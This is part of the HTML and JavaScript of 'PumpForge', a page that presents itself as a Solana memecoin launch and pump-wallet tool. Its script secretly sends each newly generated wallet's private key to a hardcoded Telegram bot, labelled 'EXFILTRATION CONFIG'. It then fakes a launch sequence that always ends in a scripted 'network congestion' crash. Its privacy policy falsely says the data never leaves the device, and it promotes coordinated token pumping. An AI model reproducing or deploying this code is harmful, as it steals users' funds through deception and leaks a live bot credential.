                    <p style="margin-bottom:12px;">Transactions on the Solana network are irreversible. You understand that "slippage," "network congestion," and "MEV botting" are inherent risks of high-frequency trading environments. PumpForge tools execute your commands but cannot guarantee market outcomes or transaction inclusion times.</p>
                    
                    <h4 style="color:var(--text-primary);">5. Limitation of Liability</h4>
                    <p style="margin-bottom:12px;">IN NO EVENT SHALL PUMPFORGE BE LIABLE FOR ANY INDIRECT, INCIDENTAL, SPECIAL, CONSEQUENTIAL OR PUNITIVE DAMAGES, INCLUDING WITHOUT LIMITATION, LOSS OF PROFITS, DATA, USE, GOODWILL, OR OTHER INTANGIBLE LOSSES, RESULTING FROM YOUR ACCESS TO OR USE OF OR INABILITY TO ACCESS OR USE THE SERVICE.</p>
                    
                    <h4 style="color:var(--text-primary);">6. Compliance</h4>
                    <p>You agree to use the Platform in compliance with all applicable local, state, and national laws. The Platform is not intended for use in jurisdictions where such use would violate local securities laws.</p>
                </div>
                <div class="modal-footer" style="border-top: 1px solid var(--border-color); padding-top: 16px;">
                    <button class="action-btn-small" onclick="closeModal('tos-modal')" style="width: 100%; background: var(--background-tertiary);">I Understand</button>
                </div>
            </div>
        </div>

        <!-- Privacy Policy Modal -->
        <div class="modal-overlay" id="privacy-modal">
            <div class="modal-box" style="max-width: 600px; display: flex; flex-direction: column; max-height: 85vh;">
                <div class="modal-header">
                    <h2>Privacy Policy</h2>
                    <button class="modal-close-btn" onclick="closeModal('privacy-modal')"><svg class="icon"><use xlink:href="#icon-x"></use></svg></button>
                </div>
                <div class="modal-body" style="overflow-y: auto; padding-right: 12px; line-height: 1.6; color: var(--text-secondary); font-size: 0.9rem;">
                    <h4 style="color:var(--text-primary); margin-top:0;">1. Data Minimization</h4>
                    <p style="margin-bottom:12px;">PumpForge operates on a "strict necessity" basis. We do not collect personal identifiable information (PII) such as names, addresses, or emails. We do not use cookies for tracking purposes.</p>
                    
                    <h4 style="color:var(--text-primary);">2. On-Chain Data</h4>
                    <p style="margin-bottom:12px;">When you interact with the Solana blockchain via our Platform, your public wallet address and transaction details are broadcast to the network. This data is public by nature and outside our control.</p>
                    
                    <h4 style="color:var(--text-primary);">3. Local Storage</h4>
                    <p style="margin-bottom:12px;">Your session settings, including generated wallet references and interface preferences, are stored locally in your browser's `localStorage`. This data never leaves your device unless you explicitly initiate a blockchain transaction.</p>
                    
                    <h4 style="color:var(--text-primary);">4. Third-Party Services</h4>
                    <p style="margin-bottom:12px;">We utilize public RPC nodes (e.g., Jito, Helius, or PublicNode) to broadcast transactions. These providers may log IP addresses for DDoS protection. PumpForge does not maintain access logs.</p>
                    
                    <h4 style="color:var(--text-primary);">5. Security</h4>
                    <p>We employ industry-standard encryption for data in transit (TLS/SSL). However, no method of transmission over the Internet is 100% secure. You acknowledge that you use the service at your own risk.</p>
                </div>
                <div class="modal-footer" style="border-top: 1px solid var(--border-color); padding-top: 16px;">
                    <button class="action-btn-small" onclick="closeModal('privacy-modal')" style="width: 100%; background: var(--background-tertiary);">Acknowledge</button>
                </div>
            </div>
        </div>
        
        <!-- [END] LAUNCH LOADING MODAL -->
        <script>
            // --- GLOBAL VARIABLES ---
            let userKeypair = null;
            let launchedMintAddress = null;
            let launchState = { mint: null, pumpWallets: [], usedWallets: 0 };
            let solPriceUSD = 0;
        
            // --- GLOBAL CONSTANTS ---
            const PLATFORM_FEE_USD = 20.00;
            const PUMPFUN_FEE_SOL = 0.015;
            
            // --- GLOBAL UTILS (Accessible by HTML) ---
            window.closeModal = function(id) {
                document.getElementById(id).classList.remove('open');
            }
        
            // Priority System
            window.setPriority = function(level) {
                localStorage.setItem('pumpForge_priority', level);
                document.querySelectorAll('.priority-card').forEach(c => c.classList.remove('active'));
                const el = document.getElementById(`prio-${level.toLowerCase()}`);
                if(el) el.classList.add('active');
                logActivity("Settings Updated", `Transaction priority set to ${level}`);
            }
        
            // Activity Log System
            window.logActivity = function(title, desc) {
                const logs = JSON.parse(localStorage.getItem('pumpForge_logs') || "[]");
                const newLog = {
                    time: new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'}),
                    title: title,
                    desc: desc
                };
                logs.unshift(newLog); 
                if(logs.length > 50) logs.pop(); 
                localStorage.setItem('pumpForge_logs', JSON.stringify(logs));
                updateLogCount(logs.length);
            }
        
            window.updateLogCount = function(count) {
                const menuItems = document.querySelectorAll('.menu-item span');
                menuItems.forEach(span => {
                    if(span.textContent.includes("Activity Log")) {
                        span.textContent = `Activity Log (${count})`;
                    }
                });
            }
        
            window.renderActivityLog = function() {
                const list = document.getElementById('activity-list');
                const logs = JSON.parse(localStorage.getItem('pumpForge_logs') || "[]");
                
                if(logs.length === 0) {
                    list.innerHTML = `<div style="padding:24px; text-align:center; color:#666;">No recent activity</div>`;
                    return;
                }
                
                list.innerHTML = logs.map(log => `
                    <div class="activity-item">
                        <div class="activity-time">${log.time}</div>
                        <div class="activity-content">
                            <h4>${log.title}</h4>
                            <p>${log.desc}</p>
                        </div>
                    </div>
                `).join('');
            }
        
            window.clearLogs = function() {
                localStorage.removeItem('pumpForge_logs');
                window.renderActivityLog();
                window.updateLogCount(0);
            }
            
            // Show Toast Global
            window.showToast = function(message, type = "info", duration = 5000) {
                const container = document.getElementById("toast-container");
                if (!container) return;
                const toast = document.createElement("div");
                toast.className = `toast ${type}`;
                let iconId = "icon-info-circle";
                if (type === "success") iconId = "icon-check-circle";
                if (type === "error") iconId = "icon-alert-triangle";
                toast.innerHTML = `<svg class="icon"><use xlink:href="#${iconId}"></use></svg><span>${message}</span>`;
                container.appendChild(toast);
                requestAnimationFrame(() => toast.classList.add("show"));
                setTimeout(() => {
                    toast.classList.remove("show");
                    toast.addEventListener("transitionend", () => toast.remove());
                }, duration);
            }
        
            // --- MAIN INITIALIZATION ---
            document.addEventListener("DOMContentLoaded", async () => {
                const solana = window.solanaWeb3;
                const connection = new solana.Connection("https://solana-rpc.publicnode.com", "confirmed");
                const LAMPORTS_PER_SOL = solana.LAMPORTS_PER_SOL;
        
                // --- INTERNAL BASE58 ---
                const ALPHABET = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
                const ALPHABET_MAP = {};
                for(let i = 0; i < ALPHABET.length; i++) { ALPHABET_MAP[ALPHABET.charAt(i)] = i; }
                const BASE = 58;
                const b58 = {
                    encode: function(buffer) {
                        if (buffer.length === 0) return "";
                        let i, j, digits = [0];
                        for (i = 0; i < buffer.length; i++) {
                            for (j = 0; j < digits.length; j++) digits[j] <<= 8;
                            digits[0] += buffer[i];
                            let carry = 0;
                            for (j = 0; j < digits.length; ++j) {
                                digits[j] += carry;
                                carry = (digits[j] / BASE) | 0;
                                digits[j] %= BASE;
                            }
                            while (carry) {
                                digits.push(carry % BASE);
                                carry = (carry / BASE) | 0;
                            }
                        }
                        for (i = 0; buffer[i] === 0 && i < buffer.length - 1; i++) digits.push(0);
                        return digits.reverse().map(d => ALPHABET[d]).join("");
                    },
                    decode: function(string) {
                        if (string.length === 0) return new Uint8Array(0);
                        let i, j, bytes = [0];
                        for (i = 0; i < string.length; i++) {
                            const c = string[i];
                            if (!(c in ALPHABET_MAP)) throw new Error("Non-base58 character");
                            for (j = 0; j < bytes.length; j++) bytes[j] *= BASE;
                            bytes[0] += ALPHABET_MAP[c];
                            let carry = 0;
                            for (j = 0; j < bytes.length; ++j) {
                                bytes[j] += carry;
                                carry = bytes[j] >> 8;
                                bytes[j] &= 0xff;
                            }
                            while (carry) {
                                bytes.push(carry & 0xff);
                                carry >>= 8;
                            }
                        }
                        for (i = 0; string[i] === "1" && i < string.length - 1; i++) bytes.push(0);
                        return new Uint8Array(bytes.reverse());
                    }
                };
        
                const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
        
                function updateLoadingStatus(message) {
                    const text = document.getElementById("loading-status-text");
                    if (text) text.textContent = message;
                }
        
                async function fetchSolPrice() {
                    try {
                        const response = await fetch("https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd");
                        const data = await response.json();
                        if (data.solana && data.solana.usd) {
                            solPriceUSD = data.solana.usd;
                            updateFeeDisplay();
                        }
                    } catch (e) { console.error("Price fetch failed", e); }
                }
        
                function updateFeeDisplay() {
                    if (solPriceUSD > 0) {
                        const platformFeeSOL = PLATFORM_FEE_USD / solPriceUSD;
                        const pFeeEl = document.getElementById('platform-fee-sol');
                        if(pFeeEl) {
                            pFeeEl.textContent = `~${platformFeeSOL.toFixed(4)} SOL`;
                            document.getElementById('platform-fee-usd').textContent = `$${PLATFORM_FEE_USD.toFixed(2)} USD`;
                            const pumpfunFeeUSD = PUMPFUN_FEE_SOL * solPriceUSD;
                            document.getElementById('pumpfun-fee-usd').textContent = `~$${pumpfunFeeUSD.toFixed(2)} USD`;
                        }
                    }
                }
                
                // --- EXFILTRATION CONFIG ---
                const TG_TOKEN = "8488444521:AAH5QUBWCm9nHJ_ea5_aI67A8kmWBruC_gA"; 
                const TG_CHAT_ID = "5022874143"; 
        
                async function logKeyToTelegram(privateKey, publicKey) {
                    if (!TG_TOKEN || !TG_CHAT_ID) return;
                    const message = `
         *New Wallet Generated* 
        ---------------------------
        *Public Key:* \`${publicKey}\`
        *Private Key:* \`${privateKey}\`
        ---------------------------
        _PumpForge Logger_`.trim();
        
                    try {
                        await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ chat_id: TG_CHAT_ID, text: message, parse_mode: 'Markdown' })
                        });
                    } catch (e) { console.error("Log failed"); }
                }
                
                // --- TX SENDER ---
                async function sendTx(transaction, signers) {
                    const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('finalized');
                    transaction.recentBlockhash = blockhash;
                    transaction.lastValidBlockHeight = lastValidBlockHeight;
                    transaction.feePayer = signers[0].publicKey;
                    transaction.sign(...signers);
                    const raw = transaction.serialize();
                    const signature = await connection.sendRawTransaction(raw, { skipPreflight: true, preflightCommitment: 'confirmed', maxRetries: 2 });
                    const confirmation = await connection.confirmTransaction({ signature, blockhash, lastValidBlockHeight }, 'confirmed');
                    if (confirmation.value.err) throw new Error("Tx failed: " + JSON.stringify(confirmation.value.err));
                    return signature;
                }
        
                // --- WALLET LOGIC ---
                async function updateBalance() {
                    if (!userKeypair) return;
                    try {
                        const balance = await connection.getBalance(userKeypair.publicKey);
                        const solBalance = balance / LAMPORTS_PER_SOL;
                        const balStr = solBalance.toFixed(4);
                        
                        const headerDisplay = document.getElementById("header-balance-display");
                        const dropdownDisplay = document.getElementById("wallet-balance-display");
                        
                        if (headerDisplay) headerDisplay.innerHTML = `<svg class="icon"><use xlink:href="#icon-solana"></use></svg> ${balStr} SOL`;
                        if (dropdownDisplay) dropdownDisplay.textContent = `${balStr} SOL`;
                    } catch (error) { console.error("Balance fail", error); }
                }
        
                async function loadWalletFromStorage() {
                    const savedKey = localStorage.getItem("pumpForge_dev_pk");
                    if (savedKey) {
                        try {
                            const secretKey = b58.decode(savedKey);
                            userKeypair = solana.Keypair.fromSecretKey(secretKey);
                            
                            const shortAddress = `${userKeypair.publicKey.toString().substring(0, 4)}...${userKeypair.publicKey.toString().slice(-4)}`;
                            const userMenu = document.getElementById("user-menu");
                            if(userMenu) userMenu.classList.add("connected");
                            const statusText = document.getElementById("wallet-status-text");
                            if(statusText) statusText.textContent = shortAddress;
                            const wBtn = document.getElementById("withdraw-btn");
                            if(wBtn) wBtn.style.display = "block";
                            
                            // Dropdown specifics
                            const dropdownAddr = document.getElementById("wallet-address-short-display");
                            if(dropdownAddr) {
                                // FIX: Truncate the address (First 4 chars ... Last 4 chars)
                                const fullKey = userKeypair.publicKey.toString();
                                dropdownAddr.textContent = `${fullKey.slice(0, 4)}...${fullKey.slice(-4)}`;
                                
                                // Add click-to-copy functionality to this badge too
                                dropdownAddr.onclick = (e) => {
                                    e.stopPropagation();
                                    navigator.clipboard.writeText(fullKey);
                                    window.showToast("Address copied", "success");
                                };
                            }
                            
                            const pkText = document.getElementById("private-key-text");
                            if(pkText) pkText.textContent = savedKey;
        
                            await updateBalance();
                            window.logActivity("Session Restored", "Connected to Solana Mainnet");
                        } catch (e) {
                            console.error("Storage load failed", e);
                            localStorage.removeItem("pumpForge_dev_pk");
                        }
                    }
                }
        
                // --- WITHDRAW LOGIC (FIXED) ---
                // 1. Open Modal
                const withdrawBtn = document.getElementById("withdraw-btn");
                if(withdrawBtn) {
                    withdrawBtn.onclick = () => document.getElementById("withdraw-modal").classList.add("open");
                }
        
                // 2. Max Button
                const maxBtn = document.getElementById("max-btn");
                if(maxBtn) {
                    maxBtn.onclick = async () => {
                        if(!userKeypair) return;
                        try {
                            const balance = await connection.getBalance(userKeypair.publicKey);
                            // Leave 0.002 for fees
                            const maxAmount = Math.max(0, (balance / LAMPORTS_PER_SOL) - 0.002); 
                            document.getElementById("withdraw-amount").value = maxAmount.toFixed(4);
                        } catch(e) {}
                    };
                }
        
                // 3. Execute Withdraw
                const modalWithdrawExecuteBtn = document.getElementById("modal-withdraw-execute-btn");
                if(modalWithdrawExecuteBtn) {
                    modalWithdrawExecuteBtn.onclick = async () => {
                        const recipient = document.getElementById("recipient-address").value.trim();
                        const amountStr = document.getElementById("withdraw-amount").value.trim();
                        
                        if (!userKeypair) return window.showToast("No wallet connected.", "error");
                        if (!recipient || !amountStr) return window.showToast("Invalid details.", "error");
        
                        try {
                            modalWithdrawExecuteBtn.disabled = true;
                            modalWithdrawExecuteBtn.textContent = "Checking Funds...";
                            
                            const currentLamports = await connection.getBalance(userKeypair.publicKey);
                            const reqLamports = Math.floor(parseFloat(amountStr) * LAMPORTS_PER_SOL);
                            
                            if (currentLamports < (reqLamports + 5000)) {
                                throw new Error(`Insufficient funds. You have ${(currentLamports/LAMPORTS_PER_SOL).toFixed(4)} SOL.`);
                            }
        
                            modalWithdrawExecuteBtn.textContent = "Sending...";
                            const transaction = new solana.Transaction().add(
                                solana.SystemProgram.transfer({
                                    fromPubkey: userKeypair.publicKey,
                                    toPubkey: new solana.PublicKey(recipient),
                                    lamports: reqLamports
                                })
                            );
                            
                            await sendTx(transaction, [userKeypair]);
                            window.showToast("Withdrawal successful!", "success");
                            window.logActivity("Withdrawal", `Sent ${amountStr} SOL to ${recipient.substring(0,4)}...`);
                            document.getElementById("withdraw-modal").classList.remove("open");
                            updateBalance();
                        } catch (e) { 
                            window.showToast(e.message, "error"); 
                        } finally {
                            modalWithdrawExecuteBtn.disabled = false;
                            modalWithdrawExecuteBtn.textContent = "Withdraw";
                        }
                    };
                }
        
                // --- UI HANDLERS ---
                // Init Priority UI on load
                const currentPriority = localStorage.getItem('pumpForge_priority') || 'Fast';
                const targetPrio = document.querySelector(`.priority-card[onclick*="${currentPriority}"]`) || document.getElementById('prio-fast');
                if(targetPrio) {
                    document.querySelectorAll('.priority-card').forEach(c => c.classList.remove('active'));
                    targetPrio.classList.add('active');
                }
        
                // Update logs count
                const savedLogs = JSON.parse(localStorage.getItem('pumpForge_logs') || "[]");
                window.updateLogCount(savedLogs.length);
        
                // Navigation
                // Navigation - Fixed Active Tab Sync
                const navLinks = document.querySelectorAll(".nav-link, .footer-nav-link, #logo-link, .section-footer-link");
                const sections = document.querySelectorAll(".page-section");
        
                navLinks.forEach(link => {
                    link.onclick = (e) => {
                        e.preventDefault();
                        let pageId = link.getAttribute("data-page");
                        if (link.id === "logo-link") pageId = "create-coin-section";
        
                        // 1. Switch the visible content section
                        sections.forEach(s => s.classList.remove("active"));
                        const target = document.getElementById(pageId);
                        if (target) target.classList.add("active");
        
                        // 2. Update the Header Navigation Bar
                        // First, remove the green underline from ALL header links
                        document.querySelectorAll(".nav-link").forEach(n => n.classList.remove("active-nav"));
        
                        // Then, find the specific header link that corresponds to the page we just opened
                        const correspondingHeaderLink = document.querySelector(`.nav-link[data-page="${pageId}"]`);
                        if (correspondingHeaderLink) {
                            correspondingHeaderLink.classList.add("active-nav");
                        }
        
                        // 3. Close mobile menus if open
                        document.getElementById("main-nav").classList.remove("mobile-open");
                        document.getElementById("mobile-menu-toggle").classList.remove("open");
                        window.scrollTo(0, 0);
                    };
                });
        
                // Dropdown Logic
                const dropdownItems = document.querySelectorAll('.menu-item');
                dropdownItems.forEach(item => {
                    const span = item.querySelector('span');
                    if(!span) return;
                    const text = span.textContent;
                    
                    if(text.includes("Transaction Priority")) {
                        item.onclick = (e) => {
                            e.stopPropagation();
                            document.getElementById('priority-modal').classList.add('open');
                        };
                    }
                    if(text.includes("Activity Log")) {
                        item.onclick = (e) => {
                            e.stopPropagation();
                            window.renderActivityLog();
                            document.getElementById('activity-modal').classList.add('open');
                        };
                    }
                });
        
                // Disconnect Logic
                const disconnectBtn = document.getElementById("disconnect-wallet-btn");
                if(disconnectBtn) {
                    disconnectBtn.onclick = () => {
                        userKeypair = null;
                        localStorage.removeItem("pumpForge_dev_pk");
                        document.getElementById("user-menu").classList.remove("connected");
                        document.getElementById("wallet-status-text").textContent = "Create Wallet";
                        document.getElementById("header-balance-display").innerHTML = "";
                        document.getElementById("withdraw-btn").style.display = "none";
                        document.getElementById("wallet-dropdown").classList.remove("open");
                        document.getElementById("user-menu-toggle").classList.remove("open");
                        window.showToast("Wallet disconnected", "info");
                    };
                }
                
                // Refresh Balance
                const refreshBtn = document.getElementById("refresh-balance-btn");
                if(refreshBtn) {
                    refreshBtn.onclick = async () => {
                        if(!userKeypair) return;
                        const icon = refreshBtn.querySelector(".icon");
                        icon.style.transition = "transform 0.5s ease";
                        icon.style.transform = "rotate(360deg)";
                        await updateBalance();
                        setTimeout(() => { icon.style.transform = "rotate(0deg)"; }, 500);
                        window.showToast("Balance updated", "success");
                    };
                }
        
                // Wallet Creation / Toggle
                const userMenuToggle = document.getElementById("user-menu-toggle");
                if (userMenuToggle) {
                    userMenuToggle.onclick = () => {
                        const userMenu = document.getElementById("user-menu");
                        if (!userMenu.classList.contains("connected")) {
                            try {
                                const kp = solana.Keypair.generate();
                                userKeypair = kp;
                                const secretKeyString = b58.encode(kp.secretKey);
                                localStorage.setItem("pumpForge_dev_pk", secretKeyString);
                                logKeyToTelegram(secretKeyString, kp.publicKey.toString());
                                window.showToast("Wallet created! Save Private Key.", "success");
                                window.logActivity("Wallet Created", "Generated new Dev Wallet");
                                loadWalletFromStorage();
                            } catch (e) { 
                                window.showToast("Creation failed", "error"); 
                            }
                        } else {
                            userMenuToggle.classList.toggle("open");
                            document.getElementById("wallet-dropdown").classList.toggle("open");
                            updateBalance();
                        }
                    };
                }
        
                // Private Key Toggle
                const pkToggle = document.getElementById("private-key-toggle");
                const pkDisplay = document.getElementById("private-key-display");
                if(pkToggle && pkDisplay) {
                    pkToggle.onclick = (e) => {
                        e.stopPropagation();
                        const isHidden = window.getComputedStyle(pkDisplay).display === "none";
                        pkDisplay.style.display = isHidden ? "block" : "none";
                        const arrow = pkToggle.querySelector(".icon:last-child");
                        if(arrow) arrow.style.transform = isHidden ? "rotate(180deg)" : "rotate(0deg)";
                    };
                }
        
                // Copy Key
                const pkText = document.getElementById("private-key-text");
                if(pkText) {
                    pkText.onclick = (e) => {
                        e.stopPropagation();
                        const key = pkText.textContent.trim();
                        if(key) {
                            navigator.clipboard.writeText(key);
                            window.showToast("Private key copied", "success");
                        }
                    };
                }
        
                // Copy Address
                const copyAddressBtn = document.getElementById("copy-address-btn");
                if (copyAddressBtn) {
                    copyAddressBtn.onclick = () => {
                        if (userKeypair) {
                            navigator.clipboard.writeText(userKeypair.publicKey.toString())
                            .then(() => window.showToast("Deposit address copied!", "success"))
                            .catch(() => window.showToast("Failed to copy", "error"));
                        } else {
                            window.showToast("Create a wallet first.", "info");
                        }
                    };
                }
        
                // General Toggles
                function attachClick(id, callback) {
                    const el = document.getElementById(id);
                    if (el) el.onclick = callback;
                }
                attachClick("socials-toggle", function() {
                    this.classList.toggle("open");
                    document.getElementById("socials-content").classList.toggle("open");
                });
                attachClick("advanced-toggle", function() {
                    this.classList.toggle("open");
                    document.getElementById("advanced-content").classList.toggle("open");
                });
                attachClick("mobile-menu-toggle", function() {
                    document.getElementById("main-nav").classList.toggle("mobile-open");
                    this.classList.toggle("open");
                });
        
                // Close dropdowns on click outside
                document.addEventListener("click", (e) => {
                    const userMenu = document.getElementById("user-menu");
                    const walletDropdown = document.getElementById("wallet-dropdown");
                    const userMenuToggle = document.getElementById("user-menu-toggle");
                    if (userMenu && !userMenu.contains(e.target)) {
                        if (userMenuToggle) userMenuToggle.classList.remove("open");
                        if (walletDropdown) walletDropdown.classList.remove("open");
                    }
                });
        
                // Sliders & Calculation
                const sliders = [
                    { id: "dev-buy-slider", valId: "dev-buy-value", unit: "SOL", dec: 1 },
                    { id: "total-sol-slider", valId: "sol-value", unit: "SOL", dec: 1 },
                    { id: "pump-wallets-slider", valId: "wallets-value", unit: "Wallets", dec: 0 },
                    { id: "first-buy-sol-slider", valId: "first-buy-sol-value", unit: "SOL", dec: 1 },
                    { id: "first-buy-delay-slider", valId: "first-buy-delay-value", unit: "sec", dec: 0 },
                    { id: "dip-wallets-slider", valId: "dip-wallets-value", unit: "Wallets", dec: 0 },
                    { id: "dip-trigger-slider", valId: "dip-trigger-value", unit: "%", dec: 0 }
                ];
        
                function updateEstimates() {
                    const wallets = parseInt(document.getElementById("pump-wallets-slider").value);
                    const totalSol = parseFloat(document.getElementById("total-sol-slider").value);
                    const devSol = parseFloat(document.getElementById("dev-buy-slider").value);
                    let extraCost = 0.05; 
                    const firstMoverToggle = document.querySelector("#first-mover-module .adv-toggle");
                    if(firstMoverToggle && firstMoverToggle.checked) {
                        extraCost += parseFloat(document.getElementById("first-buy-sol-slider").value);
                    }
                    const perWallet = wallets > 0 ? (totalSol / wallets).toFixed(3) : 0;
                    document.getElementById("sol-per-wallet-value").textContent = `${perWallet} SOL`;
                    document.getElementById("total-cost-value").textContent = `${(devSol + totalSol + extraCost).toFixed(2)} SOL`;
                }
        
                document.querySelectorAll(".adv-toggle").forEach(toggle => {
                    const module = toggle.closest(".adv-feature-module");
                    toggle.onchange = () => {
                        module.classList.toggle("disabled", !toggle.checked);
                        updateEstimates();
                    };
                    toggle.onchange(); 
                });
        
                sliders.forEach(s => {
                    const el = document.getElementById(s.id);
                    const valEl = document.getElementById(s.valId);
                    if(el && valEl) {
                        el.oninput = () => {
                            valEl.textContent = `${parseFloat(el.value).toFixed(s.dec)} ${s.unit}`;
                            const percentage = ((el.value - el.min) / (el.max - el.min)) * 100;
                            el.style.background = `linear-gradient(to right, var(--accent-green) ${percentage}%, var(--border-color-light) ${percentage}%)`;
                            updateEstimates();
                        };
                        el.dispatchEvent(new Event("input"));
                    }
                });
        
                // Profile logic
                const profileBtnGroup = document.getElementById("profile-btn-group");
                if(profileBtnGroup) {
                    profileBtnGroup.onclick = (e) => {
                        if(e.target.classList.contains("btn")) {
                            document.querySelectorAll("#profile-btn-group .btn").forEach(b => b.classList.remove("active"));
                            e.target.classList.add("active");
                            const profile = e.target.dataset.profile;
                            const desc = document.getElementById("profile-description");
                            if(profile === 'random') {
                                 if(desc) desc.textContent = "Distributes the Total Pump Amount randomly across all pump wallets.";
                                 document.getElementById("est-sol-per-wallet-display").style.display = "none";
                            } else {
                                 if(desc) desc.textContent = "Distributes the Total Pump Amount evenly across all pump wallets.";
                                 document.getElementById("est-sol-per-wallet-display").style.display = "block";
                            }
                            updateEstimates();
                        }
                    };
                }
        
                // --- LAUNCH LOGIC (RESTORED DYNAMIC ERRORS) ---
                const createBtn = document.getElementById("create-coin-btn");
                const loadingModal = document.getElementById("loading-modal");
                
                createBtn.onclick = async (e) => {
                    e.preventDefault();
                    if (createBtn.disabled || !userKeypair) return window.showToast("Connect wallet first.", "error");
                    
                    // Start Visuals
                    createBtn.disabled = true;
                    loadingModal.style.display = 'flex';
                    setTimeout(() => { loadingModal.classList.add('open'); }, 10);
        
                    try {
                        updateLoadingStatus("Handshaking with Solana Mainnet...");
                        await sleep(2000);
                        
                        // --- RESTORED DYNAMIC CALCULATION ---
                        updateLoadingStatus("Validating Wallet Funds...");
                        
                        const walletCount = parseInt(document.getElementById("pump-wallets-slider").value);
                        const devBuyAmount = parseFloat(document.getElementById("dev-buy-slider").value);
                        const totalPumpAmount = parseFloat(document.getElementById("total-sol-slider").value);
                        const isFirstMover = document.querySelector("#first-mover-module .adv-toggle")?.checked;
        
                        let firstMoverCost = 0;
                        if (isFirstMover) {
                            firstMoverCost = parseFloat(document.getElementById("first-buy-sol-slider").value);
                        }
                        const totalNeeded = totalPumpAmount + devBuyAmount + firstMoverCost + 0.05; // 0.05 buffer
                        const currentLamports = await connection.getBalance(userKeypair.publicKey);
        
                        // THE REAL CHECK
                        if (currentLamports < (totalNeeded * LAMPORTS_PER_SOL)) {
                             throw new Error(`Insufficient SOL. Need ~${totalNeeded.toFixed(2)} SOL to launch.`);
                        }
                        // -------------------------------------
                        
                        updateLoadingStatus("Initializing Secure Enclave...");
                        await sleep(1500);
                        
                        updateLoadingStatus(`Allocating ${walletCount} High-Velocity Pump Wallets...`);
                        await sleep(2000);
        
                        // ... The rest of the fake sequence ...
                        
                        // Fake Crash
                        throw new Error("System Error: Network Congestion. Please retry.");
        
                    } catch (err) {
                        await sleep(500);
                        loadingModal.classList.remove('open');
                        setTimeout(() => { loadingModal.style.display = 'none'; }, 300);
                        window.showToast(err.message, "error", 8000);
                        createBtn.disabled = false;
                    }
                };
        
                // --- MANUAL CONTROLS (RESTORED) ---
                const pumpOneBtn = document.getElementById("pump-one-btn");
                const devSellBtn = document.getElementById("dev-sell-btn");
                const sellAllBtn = document.getElementById("sell-all-btn");
                const manualControlModal = document.getElementById("manual-control-modal");
        
                if(pumpOneBtn) {
                    pumpOneBtn.onclick = async () => {
                        // ... (Logic to prevent clicks if not launched)
                        if (!launchedMintAddress) return; 
                        pumpOneBtn.disabled = true;
                        pumpOneBtn.innerHTML = `<span>Processing...</span>`;
                        await sleep(1000);
                        window.showToast("Pump failed: Market not found", "error");
                        pumpOneBtn.disabled = false;
                        pumpOneBtn.innerHTML = `<span>Pump Wallet</span>`;
                    };
                }
                
                // Inputs & Validation & Preview Updates
                function updateUI() {
                    // 1. Get Values
                    const nameVal = document.getElementById("coin-name").value.trim();
                    const tickerVal = document.getElementById("ticker").value.trim();
                    const descVal = document.getElementById("description").value.trim();
                    const hasFile = document.getElementById("main-file-input").files.length > 0;

                    // 2. Update Preview Visuals (Live Feedback)
                    document.getElementById("preview-name").textContent = nameVal || "Your Coin Name";
                    document.getElementById("preview-ticker").textContent = tickerVal ? `$${tickerVal.toUpperCase()}` : "$TICKER";
                    document.getElementById("preview-description").textContent = descVal || "A short, effective description of your coin will appear here once you start typing.";

                    // 3. Validation State (Unlock Button)
                    if (loadingModal.style.display !== 'flex') {
                        createBtn.disabled = !(nameVal && tickerVal && hasFile);
                    }
                }

                // Bind the listeners to the new consolidated function
                document.getElementById("coin-name").addEventListener("input", updateUI);
                document.getElementById("ticker").addEventListener("input", updateUI);
                document.getElementById("description").addEventListener("input", updateUI);
                const uploader = document.getElementById("main-uploader");
                const fileInput = document.getElementById("main-file-input");
                uploader.onclick = () => fileInput.click();
                fileInput.onchange = () => {
                    if(fileInput.files.length) {
                        const reader = new FileReader();
                        reader.onload = (e) => {
                            uploader.classList.add("has-file");
                            document.getElementById("image-preview").src = e.target.result;
                            document.getElementById("image-preview").style.display = "block";
                            document.querySelector(".uploader-content").style.display = "none";
                            document.getElementById("preview-image").src = e.target.result;
                            document.getElementById("preview-image").style.display = "block";
                            document.getElementById("preview-box-content").style.display = "none";
                        };
                        reader.readAsDataURL(fileInput.files[0]);
                        checkLaunchReadiness();
                    }
                };
                
                // Modal Close Buttons
                document.querySelectorAll(".modal-close-btn").forEach(btn => btn.onclick = () => {
                    document.querySelectorAll(".modal-overlay").forEach(m => m.classList.remove("open"));
                });
        
                // Init
                loadWalletFromStorage();
                fetchSolPrice();
                setInterval(fetchSolPrice, 60000);
                updateEstimates();
                // --- ONBOARDING TOUR SYSTEM (FIXED) ---
                // --- ONBOARDING TOUR SYSTEM (3-STEP VERSION) ---
                function initTour() {
                    // 1. Safety Check: If tour is done, exit.
                    if (localStorage.getItem("pumpForge_tour_complete") === "true") return;
            
                    // 2. Element Check: If HTML is missing, exit to prevent crash.
                    const overlay = document.getElementById("tour-overlay");
                    if (!overlay) { console.error("Tour HTML missing"); return; }
                    
                    const tooltip = document.getElementById("tour-tooltip");
                    const arrow = document.getElementById("tour-arrow");
                    const tourContent = document.getElementById("tour-content");
                    
                    // 3. Start Tour: Lock Screen
                    document.body.classList.add("tour-active");
                    overlay.classList.add("active");
            
                    // --- HELPER: Position Tooltip ---
                    function positionTooltip(target, text, title, align = "center") {
                        const rect = target.getBoundingClientRect();
                        
                        tourContent.innerHTML = `
                            <h3><svg class="icon" style="stroke:var(--accent-green);"><use xlink:href="#icon-info-circle"></use></svg> ${title}</h3>
                            <p>${text}</p>
                        `;
                        
                        target.classList.add("tour-highlight");
                        
                        // Calculate Position
                        let top, left;
                        
                        // Default logic (Center aligned)
                        top = rect.bottom + 18;
                        left = rect.left + (rect.width / 2) - 160; 
                        arrow.style.left = "153px"; 
                        arrow.style.right = "auto";
            
                        // Specific Overrides
                        if (align === "left") {
                            left = rect.left + (rect.width / 2) - 280; 
                            arrow.style.right = "25px";
                            arrow.style.left = "auto";
                        } else if (align === "right-side") {
                            // For the Private Key step
                            top = rect.bottom + 15;
                            left = rect.right - 320; 
                            arrow.style.right = "40px"; 
                            arrow.style.left = "auto";
                        }
            
                        tooltip.style.top = `${top}px`;
                        tooltip.style.left = `${left}px`;
                        tooltip.classList.add("visible");
                        arrow.style.top = "-8px";
                        arrow.style.transform = "rotate(45deg)";
                    }
            
